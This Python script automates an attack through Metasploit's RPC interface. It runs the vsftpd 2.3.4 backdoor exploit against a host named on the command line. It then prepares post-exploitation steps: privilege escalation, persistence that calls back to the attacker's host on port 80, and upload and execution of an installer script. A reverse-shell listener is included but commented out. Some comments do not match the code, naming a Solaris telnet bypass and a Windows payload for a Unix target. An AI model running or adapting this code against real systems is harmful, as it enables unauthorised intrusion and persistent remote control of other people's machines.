#!/usr/bin/env python
import os
from pymetasploit3.msfrpc import MsfRpcClient
import optparse
import sys
from time import sleep

# Function to create the MSF .rc files
def builder(RHOST, LHOST, LPORT):
    post = open('/tmp/ftpbackd.rc', 'w')
    bat = open('/tmp/ftpbackd_install.sh', 'w')

    postcomms = f"""getsystem
run persistence -S -U -X -i 10 -p 80 -r {LHOST}
cd /
upload /tmp/ftpbackd_install.sh /tmp
execute -f ftpbackd_install.sh
    """
    batcomm = "ftpbackd_install.sh /quiet"
    # post.write(postcomms); bat.write(batcomm)  # Uncomment to actually write to the files
    post.close()
    bat.close()

# Sets up the chain of rc files to exploit Solaris telnet bypass, setup persistence, etc.
def sploiter(RHOST, LHOST, LPORT, session):
    # Connect to Metasploit RPC
    #client = MsfRpcClient('abc123', ssl=True)  # Replace with actual password if needed
    client = MsfRpcClient('abc123', server='127.0.0.1', port=55552) # Replace with actual password if needed

    # Create a console
    console = client.consoles.console()

    # Exploit Telnet Bypass
    commands = f"""use exploit/unix/ftp/vsftpd_234_backdoor
set PAYLOAD cmd/unix/interact
set RHOST {RHOST}
exploit -z
    """
    print(f"[+] Exploiting VSFTPD Backdoor on: {RHOST}")
    console.write(commands)
    
    # Read the console output
    while True:
        res = console.read()
        if res['busy']:
            sleep(1)
            continue
        print(res['data'])  # Print command output
        break

    # Example of running a post-exploit script (commented out, uncomment if needed)
    # post_exploit = f"""use post/multi/gather/run_console_rc_file
    # set RESOURCE /tmp/sadpost.rc
    # set SESSION {session}
    # exploit
    # """
    # console.write(post_exploit)
    # sleep(5)
    # print(console.read()['data'])

    # Setting up a listener for a persistent connection back over port 80 (commented out)
    # listener = f"""use exploit/multi/handler
    # set PAYLOAD windows/meterpreter/reverse_tcp
    # set LPORT 80
    # set LHOST {LHOST}
    # exploit
    # """
    # console.write(listener)
    # sleep(5)
    # print(console.read()['data'])

def main():
    parser = optparse.OptionParser(sys.argv[0] +
    ' -p LPORT -r RHOST -l LHOST')
    parser.add_option('-p', dest='LPORT', type='string', 
                      help='Specify a port to listen on')
    parser.add_option('-r', dest='RHOST', type='string', 
                      help='Specify a remote host')
    parser.add_option('-l', dest='LHOST', type='string', 
                      help='Specify a local host')
    parser.add_option('-s', dest='session', type='string', 
                      help='Specify a session ID')
    (options, args) = parser.parse_args()

    RHOST = options.RHOST
    LHOST = options.LHOST
    LPORT = options.LPORT
    session = options.session

    if RHOST is None or LPORT is None or LHOST is None:
        print(parser.usage)
        sys.exit(0)

    builder(RHOST, LHOST, LPORT)
    sploiter(RHOST, LHOST, LPORT, session)

if __name__ == "__main__":
    main()
